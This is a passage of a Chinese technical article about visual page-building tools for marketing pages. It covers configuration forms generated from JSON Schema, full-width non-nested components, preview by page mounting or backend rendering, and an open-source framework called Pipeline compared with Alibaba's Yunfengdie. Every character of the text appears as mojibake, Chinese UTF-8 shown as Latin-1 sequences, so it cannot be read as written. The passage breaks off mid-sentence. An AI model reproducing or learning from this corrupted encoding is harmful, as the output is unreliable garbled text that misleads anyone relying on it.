ç»„ä»¶é…ç½®è¡¨å•é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„ä¸»è¦ä½¿ç”¨äººå‘˜æ˜¯è¿è¥/äº§å“, å¦‚æœè®©è¿è¥/äº§å“äººå‘˜ç›´æ¥ç¼–è¾‘æ–‡æœ¬æ ¼å¼çš„ç»„ä»¶é…ç½®æ•°æ®, æ“ä½œä¸å‹å¥½å¹¶ä¸”å®¹æ˜“å‡ºé”™. éœ€æä¾›å¯è§†åŒ–çš„ç¼–è¾‘æ–¹å¼ â€“ ä½¿ç”¨ Form è¡¨å•æ¥å¡«å…¥é…ç½®æ•°æ®. Form è¡¨å•æ˜¯é¡µé¢ä¸­æ•°æ®äº¤äº’çš„åŸºæœ¬å½¢å¼, éå¼€å‘äººå‘˜ä½¿ç”¨ä¹Ÿæ²¡æœ‰æŠ€æœ¯é—¨æ§›. ä½¿ç”¨é…ç½®è¡¨å•æ¥å¡«å…¥é…ç½®æ•°æ®æœ‰2ä¸ªå¥½å¤„: é…ç½®è¡¨å•äº¤äº’åŠŸèƒ½å®Œå–„, å®¹æ˜“ä½¿ç”¨. é…ç½®è¡¨å•å¯ä»¥æ·»åŠ æ ¡éªŒé€»è¾‘, é¿å…å¡«å…¥é”™è¯¯çš„é…ç½®æ•°æ®. å¦‚ä¸Šå›¾æ‰€ç¤º, ç”±äºç»„ä»¶é…ç½®æ•°æ®çš„å·®å¼‚åŒ–, ç»„ä»¶é…ç½®è¡¨å•ä¹Ÿæ˜¯å·®å¼‚åŒ–çš„, éœ€ä¸ºç»„ä»¶åº“ä¸­çš„æ¯ä¸ªç»„ä»¶æä¾›ç›¸åº”çš„é…ç½®è¡¨å•. å¦‚æœä¸ºæ¯ä¸ªç»„ä»¶éƒ½ç¼–å†™ä¸€ä¸ªè¡¨å•é¡µé¢, å·¥ä½œé‡è¾ƒå¤§; å¯¹äºå¤æ‚çš„é…ç½®é¡¹, è¡¨å•é¡µé¢çš„ç¼–å†™å·¥ä½œé‡å¯èƒ½ä¼šå¤§äºé¡µé¢ç»„ä»¶çš„å¼€å‘å·¥ä½œé‡. éœ€è¦é‡ç‚¹è€ƒè™‘æä¾›é…ç½®è¡¨å•çš„æ–¹å¼. æŠ€æœ¯éš¾ç‚¹2: å¦‚ä½•ç”¨æœ€ç®€å•çš„æ–¹å¼ç”Ÿæˆé…ç½®æ•°æ®ç¼–è¾‘è¡¨å•. ç»„ä»¶å±‚çº§å…³ç³»ç»„ä»¶æ ‘å®šä¹‰äº†ç»„ä»¶é—´çˆ¶å­å…„å¼Ÿçš„å±‚çº§å…³ç³», çˆ¶å­ç»„ä»¶é€šè¿‡æ•°æ®æµå’Œäº‹ä»¶è¿›è¡Œå…³è”: æ•°æ®ä»çˆ¶ç»„ä»¶çš„ State ä¼ é€’åˆ°å­ç»„ä»¶çš„ Props; å­ç»„ä»¶çš„å˜æ›´è§¦å‘ Event é€šçŸ¥çˆ¶ç»„ä»¶. å±‚çº§å…³ç³»å¯¹æ•°æ®æµå’Œå¸ƒå±€çš„å½±å“é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·ç¼–è¾‘ç»„ä»¶æ ‘æ—¶, ä¼šä¿®æ”¹ç»„ä»¶æ•°æ®æµ. è€Œä¸åŒç»„ä»¶çš„ Props å’Œ State æ˜¯å¼‚æ„çš„, åœ¨ç¼–è¾‘ç»„ä»¶æ ‘æ—¶, éœ€è¦å¤„ç†ä¸åŒç»„ä»¶äº§ç”Ÿå±‚çº§å…³ç³»åå¯¹æ•°æ®æµçš„å½±å“. å¦‚ä¸‹å›¾, çˆ¶ç»„ä»¶çš„ State åªåŒ…å«å­ç»„ä»¶Açš„ Props, å°†å­ç»„ä»¶BæŒ‚è½½ä¸ºçˆ¶ç»„ä»¶çš„å­ç»„ä»¶, çˆ¶ç»„ä»¶æ²¡æœ‰å­ç»„ä»¶Bçš„ Props, ä¼šå¯¼è‡´æ— æ³•æ¸²æŸ“å­ç»„ä»¶B. åŒç†, ä¸åŒçš„ç»„ä»¶æœ‰ä¸åŒçš„æ ·å¼å¸ƒå±€, ç¼–è¾‘ç»„ä»¶æ ‘æ—¶, éœ€è¦å¤„ç†ä¸åŒç»„ä»¶äº§ç”Ÿå±‚çº§å…³ç³»åå¸¦æ¥çš„å¸ƒå±€å½±å“. å¦‚ä¸‹å›¾, ä¸€ä¸ªçˆ¶ç»„ä»¶ä¸ºè¡Œå†…ç»„ä»¶, ç»™å…¶æ·»åŠ ä¸€ä¸ªå—çº§ç»„ä»¶ä½œä¸ºå­ç»„ä»¶, æ¸²æŸ“åå¯èƒ½ä¼šå¯¼è‡´è¡Œå†…ç»„ä»¶è¢«å—çº§ç»„ä»¶æ’‘å¼€. æ‰€ä»¥è®¾è®¡é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„ç»„ä»¶æ ‘ç¼–è¾‘åŠŸèƒ½æ—¶, éœ€è¦é‡ç‚¹å…³æ³¨ç»„ä»¶æ ‘çš„å±‚çº§å…³ç³», è§£å†³ç»„ä»¶é—´æ•°æ®ä¾èµ–å’Œç»„ä»¶é—´å¸ƒå±€é€‚é…é—®é¢˜. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·éœ€è¦åˆ¶è®¢ç»„ä»¶åµŒå¥—çš„è§„åˆ™å’Œçº¦æŸ, é€šè¿‡ç»„ä»¶åµŒå¥—è§„åˆ™æ¥ç¡®ä¿å¯è§†åŒ–ç¼–è¾‘åçš„ç»„ä»¶æ ‘æ­£å¸¸æ¸²æŸ“. æŠ€æœ¯éš¾ç‚¹3: å¦‚ä½•ç»„ç»‡é¡µé¢ç»„ä»¶çš„å±‚çº§å…³ç³». ä½¿ç”¨ç»„ä»¶åµŒå¥—çš„æ­å»ºå·¥å…·ç¤ºä¾‹: ä¸åµŒå¥—çš„å‰ç«¯æ¡†æ¶ç»„ä»¶å¯ä»¥æƒ³è±¡, ç»„ä»¶çš„åµŒå¥—ä¼šåŠ å¤§é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æ¶æ„è®¾è®¡å’Œå¼€å‘éš¾åº¦. æˆ‘ä»¬æ³¨æ„åˆ°, è¥é”€æ´»åŠ¨çš„ä¸»è¦å¹³å°æ˜¯ç§»åŠ¨ç«¯, ç§»åŠ¨ç«¯é¡µé¢çš„å¸¸ç”¨çš„å¸ƒå±€ç­–ç•¥æ˜¯: å®½åº¦é“ºæ»¡, é«˜åº¦æ»šåŠ¨. å¦‚æœå‰ç«¯æ¡†æ¶ç»„ä»¶éƒ½è®¾ç½®ä¸ºé“ºæ»¡å®½åº¦, é¡µé¢å±•ç¤ºæ—¶ç»„ä»¶åªéœ€åœ¨æµè§ˆå™¨å‚ç›´æ–¹å‘ä¸Šé¡ºåºæ’åˆ—, åˆ™ç»„ä»¶ç»„åˆæ—¶ä¸éœ€è¦åµŒå¥— â€“ æ‰€æœ‰ç»„ä»¶äº’ä¸ºå…„å¼ŸèŠ‚ç‚¹. è¿™ç§é“ºæ»¡é¡µé¢å®½åº¦çš„ç»„ä»¶, éå¸¸é€‚åˆæ­å»ºç§»åŠ¨ç«¯é¡µé¢çš„åœºæ™¯: åœ¨æ‰¿è½½é¡µé¢é€»è¾‘çš„åŒæ—¶, ä½¿å¾—é¡µé¢çš„ç¼–è¾‘æ›´åŠ ç®€å•, ä½¿ç”¨è€…åªéœ€å¤„ç†ç»„ä»¶çš„é¡ºåº, æ— éœ€å¤„ç†ç»„ä»¶çš„åµŒå¥—. åœ¨ç§»åŠ¨ç«¯, ä½¿ç”¨éåµŒå¥—ç»„ä»¶å±‚çº§è§„åˆ™çš„é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æœ‰: é˜¿é‡Œäº‘å‡¤è¶ã€pipeline ç­‰. é˜¿é‡Œäº‘å‡¤è¶å›¾ç¤º: å¯è§†åŒ–æ­å»ºPCç«¯ä¸­åå°ç³»ç»Ÿé¡µé¢çš„å·¥å…·, åŒæ ·å¯ä»¥é‡‡ç”¨ä¸åµŒå¥—ç»„ä»¶å±‚çº§è§„åˆ™, å¦‚é˜¿é‡Œçš„é£å†°: é¡µé¢é¢„è§ˆé¡µé¢å®æ—¶é¢„è§ˆæ˜¯é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„å¿…è¦éƒ¨åˆ†, ä½¿ç”¨äººå‘˜å¯ä»¥åœ¨é€šè¿‡é¡µé¢é¢„è§ˆæ¥æŸ¥çœ‹å’ŒéªŒè¯å¯è§†åŒ–ç¼–è¾‘çš„æ•ˆæœ. é¡µé¢é¢„è§ˆç¤ºä¾‹: ç”¨æˆ·çš„å¯è§†åŒ–ç¼–è¾‘åŒ…æ‹¬ä¿®æ”¹ç»„ä»¶æ ‘å’Œä¿®æ”¹ç»„ä»¶é…ç½®æ•°æ®. å¦‚ä¸‹å›¾, ç”¨æˆ·ä¿®æ”¹é¡µé¢å, éœ€è¦é‡æ–°æ¸²æŸ“é¡µé¢ç»„ä»¶, å¾—åˆ°æ–°çš„é¢„è§ˆé¡µé¢. å®ç°é¡µé¢é¢„è§ˆæœ‰ä¸¤ç§æ–¹å¼: é¡µé¢æŒ‚è½½å’Œåå°æ¸²æŸ“. é¡µé¢æŒ‚è½½é¡µé¢æŒ‚è½½æŒ‡åœ¨ç¼–è¾‘å™¨å‰ç«¯é¡µé¢çš„æŸä¸ªå…ƒç´ èŠ‚ç‚¹(div)ä¸Šæ¸²æŸ“å‡ºç”¨æˆ·ç¼–è¾‘çš„æ•ˆæœ. é¡µé¢æŒ‚è½½æµç¨‹å›¾å¦‚ä¸‹: ä½¿ç”¨é¡µé¢æŒ‚è½½çš„é¢„è§ˆæ–¹å¼, ç¼–è¾‘å™¨å‰ç«¯é¡µé¢éœ€è¦æä¾›ç»„ä»¶åº“ç»„ä»¶æ¸²æŸ“ç¯å¢ƒ(ç»„ä»¶åº“å‰ç«¯æ¡†æ¶); ä¸ºå®ç°å‰ç«¯æ¸²æŸ“, ç¼–è¾‘å™¨å‰ç«¯æºç éœ€å¼•å…¥ç»„ä»¶åº“ç»„ä»¶æºç , åç»­ç»„ä»¶åº“æ›´æ–°, ç¼–è¾‘å™¨éœ€è¦åŒæ­¥æ›´æ–°. é¡µé¢æŒ‚è½½æ–¹å¼æœ‰ä»¥ä¸‹ç‰¹ç‚¹: å®ç°é¡µé¢é¢„è§ˆæŠ€æœ¯æ–¹æ¡ˆå¯è¡Œ, å®æ—¶æ¸²æŸ“é€Ÿåº¦å¿«. ä¸ºå®ç°æ¸²æŸ“, ç¼–è¾‘å™¨çš„æŠ€æœ¯é€‰å‹éœ€å’Œç»„ä»¶åº“å‰ç«¯æ¡†æ¶ä¸€è‡´. ç¼–è¾‘å™¨æºç å’Œç»„ä»¶åº“æºç è€¦åˆ. ç»„ä»¶åº“ç»„ä»¶æ¸²æŸ“åçš„ä»£ç é€»è¾‘å’Œæ ·å¼å¸ƒå±€, å¯èƒ½ä¼šæ±¡æŸ“ç¼–è¾‘å™¨é¡µé¢. åå°æ¸²æŸ“åå°æ¸²æŸ“æŒ‡åœ¨åå°è¿›è¡Œç”¨æˆ·ç¼–è¾‘ç»“æœé¡µé¢çš„æ¸²æŸ“å’Œç”Ÿæˆ, ç¼–è¾‘å™¨å‰ç«¯é¡µé¢é€šè¿‡ iframe åŠ è½½å’Œå±•ç¤ºç»“æœé¡µé¢. åå°æ¸²æŸ“æµç¨‹å›¾å¦‚ä¸‹: ä½¿ç”¨åå°æ¸²æŸ“çš„é¢„è§ˆæ–¹å¼, ç¼–è¾‘å™¨å‰ç«¯é¡µé¢å¹¶ä¸éœ€è¦æ¸²æŸ“ç»„ä»¶åº“çš„ç»„ä»¶; ç”šè‡³ä¸éœ€è¦ç»„ä»¶æºç , åªéœ€çŸ¥é“å„ä¸ªç»„ä»¶çš„æè¿°ä¿¡æ¯. åå°æ¸²æŸ“æœ‰ä»¥ä¸‹ç‰¹ç‚¹: å¯ä»¥å®ç°ç¼–è¾‘å™¨å’Œç»„ä»¶åº“å‰ç«¯æ¡†æ¶çš„åˆ†ç¦». å¯ä»¥å®ç°ç¼–è¾‘å™¨å’Œç»„ä»¶åº“å„ç»„ä»¶çš„åˆ†ç¦». å¯ä»¥é¿å…é¢„è§ˆé¡µé¢çš„é€»è¾‘å’Œæ ·å¼æ±¡æŸ“ç¼–è¾‘å™¨ç¯å¢ƒ. è¦æ±‚åå°å’Œç»„ä»¶åº“æä¾›é¡µé¢åå°æ¸²æŸ“èƒ½åŠ›, å¹¶è¦æ±‚åå°æ¸²æŸ“é€Ÿåº¦å¿«, ç”¨æˆ·éœ€è¦â€å®æ—¶â€é¢„è§ˆ. éš¾ç‚¹4: å¦‚ä½•å®ç°ç»„ä»¶åº“çš„å¿«é€Ÿåå°æ¸²æŸ“, ä»è€Œå®ç°ç¼–è¾‘å™¨å’Œç»„ä»¶åº“å‰ç«¯æ¡†æ¶çš„åˆ†ç¦». é¡µé¢æ„å»ºé¡µé¢æ„å»ºæ˜¯ç»„ä»¶åŒ–å‰ç«¯æºç ç”Ÿæˆé¡µé¢èµ„æºçš„å¿…è¦ç¯èŠ‚: åœ¨å¼€å‘æ—¶éœ€è¦è¿›è¡Œå¼€å‘æ„å»ºæ¥è¿›è¡Œé¡µé¢è°ƒè¯•; åœ¨å¯è§†åŒ–ç¼–è¾‘åå¯èƒ½éœ€è¦é‡æ–°æ„å»ºæ¥ç”Ÿæˆé¢„è§ˆé¡µé¢; åœ¨å‘å¸ƒå‰éœ€è¦è¿›è¡Œç”Ÿäº§æ„å»º. åœ¨å¯è§†åŒ–æ­å»ºé¡µé¢æ—¶éœ€è¦â€œå®æ—¶â€é¢„è§ˆ, è¦æ±‚é¡µé¢é¡µé¢æ„å»ºæ•ˆç‡é«˜, å®ç°å¿«é€Ÿçš„æ„å»ºå’Œæ‰“åŒ…. æ›´è¿›ä¸€æ­¥, åå°æ¸²æŸ“å…¶å®å’ŒæœåŠ¡ç«¯æ¸²æŸ“å¾ˆåƒ, èƒ½å¦å€Ÿé‰´æœåŠ¡ç«¯æ¸²æŸ“çš„æŠ€æœ¯æ€è·¯. è‡ªå®šä¹‰æ¨¡æ¿å’Œç»„ä»¶å¼€å‘é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·åœ¨ä¸šåŠ¡ä¸­çš„è½åœ°, éœ€è¦æ ¹æ®ä¸åŒçš„ä¸šåŠ¡åœºæ™¯è¿›è¡Œä¸šåŠ¡ç»„ä»¶å’Œé¡µé¢æ¨¡æ¿çš„è‡ªå®šä¹‰å¼€å‘. è¿™å¯¹é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æå‡º3ä¸ªè¦æ±‚: é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·è¦æ”¯æŒä¸šåŠ¡ç°æœ‰çš„å‰ç«¯æ¡†æ¶. é¿å…åç»­ç»„ä»¶å’Œæ¨¡æ¿è‡ªå®šä¹‰å¼€å‘æ—¶çš„å·¥ä½œé‡å’Œå‰²è£‚æ„Ÿ. æˆ‘ä»¬æ˜¯å¸Œæœ›å¤ç”¨ç°æœ‰å‰ç«¯æ¡†æ¶ç»„ä»¶, è€Œä¸æ˜¯ç”¨å¦ä¸€ä¸ªå‰ç«¯æ¡†æ¶é‡å†™ä¸€é. ç»„ä»¶å’Œæ¨¡æ¿çš„ç¼–å†™æ–¹å¼éœ€éµå¾ªè¾ƒç®€å•çš„ç¼–å†™çº¦å®š, é¿å…å¼€å‘äººå‘˜éš¾ä¸Šæ‰‹å’Œå†™èµ·æ¥ä¸èˆ’æœ. è‡ªå®šä¹‰æ¨¡æ¿å’Œç»„ä»¶å’Œåœ¨å¼€å‘æ¨¡å¼ä¸‹è¿›è¡Œè°ƒè¯•å’Œæµ‹è¯•. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å¿…ç„¶ä¼šå¯¹é¡µé¢æ¨¡æ¿å’Œé¡µé¢ç»„ä»¶çš„ç¼–ç æ–¹å¼è¿›è¡Œé™å®š. è¿™è¦æ±‚å°±é¡µé¢å¯è§†åŒ–å·¥å…·åœ¨é¡µé¢æ¨¡æ¿å’Œé¡µé¢ç»„ä»¶ä¸Šçš„çº¦æŸè¾ƒå°‘, å‡å°‘å¯¹å‰ç«¯æ¡†æ¶ä»£ç ç»„ç»‡æ–¹å¼çš„å…¥ä¾µç‚¹. ç†æƒ³çš„æ´»åŠ¨é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, éœ€è¦å¯¹é¡µé¢åšä¸€äº›çº¦å®šå’Œçº¦æŸ, åœ¨å¯è§†åŒ–æ­å»ºæ—¶éµå¾ªå·¥å…·çº¦å®šå’Œçº¦æŸæ¥ç¼–è¾‘é¡µé¢. ä»é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æŠ€æœ¯è¦ç‚¹ä¸­, å¯ä»¥å½’çº³å‡ºæ´»åŠ¨é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„ç†æƒ³å½¢æ€. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æœ‰ä¸åŒçš„æ¡†æ¶è®¾è®¡å’Œå®ç°æ–¹å¼, ä¸åŒçš„åŠŸèƒ½æœ‰ä¸åŒçš„é€‚ç”¨åœºæ™¯, è¯¦ç»†åˆ†ç±»å¯ä»¥å‚è€ƒç¬”è€…ä»¥å‰çš„æ–‡ç« : é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å‰ç”Ÿä»Šä¸–. æ¦‚è¿°è¿è¥é¡µé¢æ­å»ºå·¥å…·, å®ç°åŸºäºæ¨¡æ¿çš„é¡µé¢ç”Ÿæˆ; å°†é¡µé¢çš„é€»è¾‘åŠŸèƒ½å°è£…åœ¨ç»„ä»¶å†…, å£°æ˜é¡µé¢é…ç½®æ•°æ®å¹¶æä¾›é…ç½®è¡¨å•, é€šè¿‡å¯¹é…ç½®è¡¨å•çš„æ•°æ®å¡«å……, è¿›è¡Œå°‘é‡é¡µé¢ç¼–è¾‘å°±å¯ä»¥å®Œæˆä¸šåŠ¡é¡µé¢æ­å»º. ä¸åµŒå¥—çš„ç»„ä»¶åœ¨ç¼–è¾‘è‡ªç”±åº¦çš„é€‰æ‹©ä¸Š, é€‰ç”¨ä¸åµŒå¥—çš„ç»„ä»¶.å„ç»„ä»¶é“ºæ»¡é¡µé¢å®½åº¦, åœ¨é¡µé¢é«˜åº¦æ–¹å‘é¡ºåºæ’åˆ—.è§£å†³ç»„ä»¶åµŒå¥—å¸¦æ¥çš„æ•°æ®æµé—®é¢˜. ä¸åµŒå¥—çš„ç»„ä»¶å¦‚ä¸‹å›¾å„ä¸ªçº¢æ¡†æ¡†èµ·æ¥çš„éƒ¨åˆ†æ‰€ç¤º. é…ç½®è¡¨å•è‡ªåŠ¨ç”Ÿæˆé…ç½®è¡¨å•çš„ä½œç”¨æ˜¯ç”Ÿæˆå’Œçº¦æŸ JSON é…ç½®æ•°æ®, ä¸šç•Œå·²æœ‰å¯¹ JSON è¿›è¡Œæè¿°å’Œè‡ªåŠ¨ç”Ÿæˆè¡¨å•çš„æ–¹æ¡ˆ â€“ JSON Schema. æŒ‰ç…§ JSON Schema è§„èŒƒå¯¹ JSON æ•°æ®è¿›è¡Œæè¿°, å¯ä»¥åŠ¨æ€æ¸²æŸ“å‡ºé…ç½®è¡¨å•; ä¸” JSON Schema å¯ä»¥å¯¹ç¼–è¾‘åçš„æ•°æ®åšæ ¼å¼æ ¡éªŒ, é¿å…ç¼–è¾‘é”™è¯¯. è¿™æ¯”ç¼–å†™ä¸€ä¸ªè¡¨å•é¡µé¢æ›´åŠ ç®€å•å’Œé«˜æ•ˆ. JSON Schema çš„è¯­æ³•å¹¶ä¸æ˜¯å¾ˆç²¾ç®€, äº‘å‡¤è¶çš„ Schema è¯­æ³• ç­‰æ–¹æ¡ˆæ›´ç®€æ´, ä½†æ˜¯äº‘å‡¤è¶çš„è¯­æ³•æ²¡æœ‰å¼€æºçš„è¡¨å•ç”Ÿæˆåº“æ”¯æŒ, åœ¨å¼€æºå®è·µä¸Šè¿˜æ˜¯ JSON Schema æœ€ä½³. ç†æƒ³æ´»åŠ¨é¡µé¢æ­å»ºå·¥å…·ç‰¹ç‚¹ é‡‡ç”¨ç»„ä»¶åŒ–å’Œé¡µé¢æ¨¡æ¿å®ç°é¡µé¢ç”Ÿæˆæ•ˆç‡çš„æå‡. é‡‡ç”¨ä¸åµŒå¥—çš„ç»„ä»¶å±‚çº§ç®€åŒ–æ•°æ®æµå’Œæ ·å¼å¸ƒå±€. é‡‡ç”¨ JSON Schema å£°æ˜é…ç½®æ•°æ®, è‡ªåŠ¨ç”Ÿæˆé…ç½®è¡¨å•. é‡‡ç”¨åå°æ¸²æŸ“, ä½¿ç¼–è¾‘ç³»ç»Ÿä¸ç»„ä»¶å‰ç«¯æ¡†æ¶è§£è€¦. åœ¨éµå¾ªç¼–è¾‘ç³»ç»Ÿçº¦å®šä¸‹, ç»„ä»¶å¯ä»¥è‡ªç”±æ‹“å±•, å‰ç«¯æ¡†æ¶å¯ä»¥è‡ªç”±é€‰æ‹©. é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶ Pipelineç®€ä»‹Pipeline æ˜¯ä¸€ä¸ªå¼€æºçš„é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶, ä¸»è¦ç”±ç¬”è€…åœ¨ç»´æŠ¤. Pipeline æ„ä¸ºæµæ°´çº¿, æœŸæœ› pipeline åƒå·¥å‚æµæ°´çº¿ä¸€æ ·å¯ä»¥é«˜æ•ˆåœ°ç»„è£…æ´»åŠ¨é¡µé¢. æ‰€è°“æ¡†æ¶, æ˜¯å®ƒå®ç°äº†é¡µé¢å¯è§†åŒ–æ­å»ºçš„åŸºæœ¬åŠŸèƒ½, è§£å†³äº†é¡µé¢å¯è§†åŒ–æ­å»ºçš„åŸºæœ¬éš¾ç‚¹, å¯ä»¥è®©å¼€å‘è€…å¿«é€Ÿæ‹¥æœ‰é¡µé¢æ­å»ºçš„èƒ½åŠ›, å¹¶æ”¯æŒç§æœ‰éƒ¨ç½²å’ŒäºŒæ¬¡å¼€å‘. é¡¹ç›®ä¿¡æ¯: é¡¹ç›®åœ°å€: github.com/page-pipeplâ€¦ ä½“éªŒåœ°å€: page-pipepline.github.io/pipeline-edâ€¦ é¡¹ç›®æ–‡æ¡£: github.com/page-pipeplâ€¦ åŠŸèƒ½ Demoå¯è§†åŒ–ç¼–è¾‘ å¦‚åŠ¨å›¾æ‰€ç¤º, pipeline çš„å¯è§†åŒ–ç¼–è¾‘èƒ½åŠ›æœ‰: å¯è§†åŒ–ä¿®æ”¹é¡µé¢å…¨å±€é…ç½®, å¦‚ä¿®æ”¹é¡µé¢ä¸»é¢˜é¢œè‰². å¯è§†åŒ–ä¿®æ”¹é¡µé¢ç»„ä»¶å†…å®¹, å¦‚ä¿®æ”¹ç»„ä»¶çš„å›¾ç‰‡å’Œæ›¿æ¢ç»„ä»¶æ–‡æœ¬. å®æ—¶é¢„è§ˆé¡µé¢ç¼–è¾‘æ•ˆæœ, å³åˆ»è·å¾—æ­å»ºåçš„é¡µé¢. é¡µé¢æ”¯æŒç”¨æˆ·äº¤äº’. ç»„ä»¶ç¼–è¾‘ å¦‚åŠ¨å›¾æ‰€ç¤º, pipeline çš„ç»„ä»¶ç¼–è¾‘èƒ½åŠ›æœ‰: åŠ¨æ€å¢åˆ é¡µé¢ç»„ä»¶. å¯è§†åŒ–çš„ç»„ä»¶æ‹–æ‹½, æ‹–æ‹½ç»„ä»¶åº“ç»„ä»¶æ’å…¥åˆ°é¡µé¢ç»„ä»¶åˆ—è¡¨ä¸­. ç»„ä»¶å¯ä»¥åŒ…å«ä¸šåŠ¡é€»è¾‘(ç½‘ç»œè¯·æ±‚å’Œç”¨æˆ·äº¤äº’). æ”¯æŒçš„å‰ç«¯æ¡†æ¶Pipeline å®ç°äº†ç¼–è¾‘å™¨å’Œé¡µé¢å‰ç«¯æ¡†æ¶çš„åˆ†ç¦», å¯ä»¥æ”¯æŒä¸åŒçš„å‰ç«¯æ¡†æ¶. æ‰€è°“æ”¯æŒçš„å‰ç«¯æ¡†æ¶, å°±æ˜¯å¯¹æŸä¸ªå‰ç«¯æ¡†æ¶æŒ‰ç…§ pipeline çš„çº¦æŸè§„åˆ™è¿›è¡Œç»„ä»¶ç¼–è¾‘æ–¹å¼å’Œå·¥ç¨‹æ„å»ºæ–¹å¼çš„æ”¹é€ , ä½¿å¾—å‰ç«¯æ¡†æ¶é¡µé¢å¯ä»¥åœ¨ pipeline ä¸­å¯è§†åŒ–æ­å»º. ç›®å‰å·²ç»æ”¯æŒ Vue, React, å’Œ Omi, ç†è®ºä¸Šå¯ä»¥æ”¯æŒä»»æ„å‰ç«¯æ¡†æ¶. æ¡†æ¶ç‰¹ç‚¹ å¼€æºé¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶. è‡ªå®šä¹‰é¡µé¢å¯é…ç½®å­—æ®µ. ç»„ä»¶åŠ¨æ€å¢å‡, ç»„ä»¶æ‹–æ‹½. ä»é¡µé¢æ¨¡æ¿å¿«é€Ÿç”Ÿæˆä¸šåŠ¡é¡µé¢. æ¨¡æ¿å·¥ç¨‹/ç¼–è¾‘å™¨/åå°æœåŠ¡è§£å¶. æ¨¡æ¿å·¥ç¨‹å‰ç«¯æ¡†æ¶æ— å…³: æ”¯æŒ vue å’Œ react ç­‰. æ”¯æŒè‡ªç”±æ‹“å±•é¡µé¢ç»„ä»¶, ä¸é™åˆ¶ç»„ä»¶æ ·å¼å¸ƒå±€, æ¥å£è°ƒç”¨ç­‰. å‰ç«¯å·¥ç¨‹çº¦æŸå°‘, ä¸é™åˆ¶ä½¿ç”¨å…¶ä»–æŠ€æœ¯(Redux, SSR, UIåº“ç­‰). ä¸äº‘å‡¤è¶çš„å¯¹æ¯”é˜¿é‡Œäº‘å‡¤è¶ æ˜¯ç›®å‰å¸‚åœºä¸Šå¯è§ä¸­æœ€æ£’çš„é¡µé¢å¯è§†åŒ–æ­å»ºæœåŠ¡, pipeline çš„å¾ˆå¤šæ–¹é¢å’Œäº‘å‡¤è¶ç›¸ä¼¼, åšä¸ªç®€å•å¯¹æ¯”: äº‘å‡¤è¶ pipeline å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆ, ç›´æ¥å¯ç”¨ å¼€æºç³»ç»Ÿ, åŸºç¡€çš„é¡µé¢æ­å»ºæ¡†æ¶, éœ€è¦è‡ªè¡Œéƒ¨ç½² ç”Ÿæˆçš„é¡µé¢, ä¸Šä¼ çš„å›¾ç‰‡ç­‰åªèƒ½æ‰˜ç®¡åœ¨é˜¿é‡Œ, ä¹Ÿé™å®šåŸŸå èµ„æºè½åœ°å’Œå‘¨è¾¹åŠŸèƒ½éœ€è¦è‡ªè¡Œæ­å»º, ä½†æ˜¯å¯ä»¥100%æŒæ§æ‰€æœ‰èµ„æº é…ç½®è¡¨å•åŠŸèƒ½æ¯”è¾ƒå®Œå–„ é…ç½®è¡¨å•æ¯”è¾ƒåŸºç¡€, éœ€è¦æå‡ ä½¿ç”¨è‡ªå®šä¹‰çš„ç»„ä»¶é…ç½®çº¦æŸè§„åˆ™ ä½¿ç”¨é€šç”¨çš„ JSON Schema è§„èŒƒ æ¨¡æ¿å‰ç«¯æ¡†æ¶é‡‡ç”¨ Nunjucks å‰ç«¯æ¡†æ¶é‡‡ç”¨æ²¡æœ‰çº¦æŸ, å·²ç»æ”¯æŒ vue å’Œ react ç­‰, ä¸šåŠ¡è¿ç§»æˆæœ¬ä½ éšè—äº†æ¨¡æ¿çš„æ„å»ºå¤„ç†è¿‡ç¨‹, æä¾›åˆ¶å®šçš„ IDE é‡‡ç”¨ webpack æ„å»º, æ¨¡æ¿å¼€å‘ä¸æ­£å¸¸å‰ç«¯é¡¹ç›®å¼€å‘ä¸€è‡´ ä¸æ”¯æŒè‡ªå®šä¹‰é¡µé¢çº§åˆ«çš„é…ç½®é¡¹ æ”¯æŒè‡ªå®šä¹‰é¡µé¢çº§åˆ«çš„é…ç½®é¡¹ æ€»çš„æ¥è¯´: äº‘å‡¤è¶æ˜¯å®Œæ•´çš„å•†ä¸šåŒ–é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿ, é€‚åˆåä¸šåŠ¡è¿è¥çš„å…¬å¸; pipeline æ˜¯å¼€æºçš„é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶, é€‚åˆéœ€è¦è‡ªå»ºé¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸”æœ‰æŠ€æœ¯äººå‘˜æ”¯æŒçš„å…¬å¸. ä¸‹ä¸€æ­¥å·¥ä½œ å®Œå–„æŠ€æœ¯å®ç°æ–‡æ¡£, ä½¿ç”¨æ–‡æ¡£, ç³»ç»Ÿéƒ¨ç½²æ–‡æ¡£å’Œæ¨¡æ¿å¼€å‘æ–‡æ¡£. æä¾›å¯¹æ›´å¤šå‰ç«¯æ¡†æ¶çš„æ”¯æŒ. æä¾›æ›´åŠ ä¸°å¯Œçš„å¯è§†åŒ–äº¤äº’æ–¹å¼. æ€»ç»“æœ¬æ–‡è®¨è®ºäº†æ´»åŠ¨é¡µé¢å¼€å‘çš„ç—›ç‚¹, æ€»ç»“å‡ºé¡µå¯è§†åŒ–æ­å»ºå·¥å…·çš„7ä¸ªæŠ€æœ¯è¦ç‚¹å’Œ4ä¸ªæŠ€æœ¯éš¾ç‚¹, 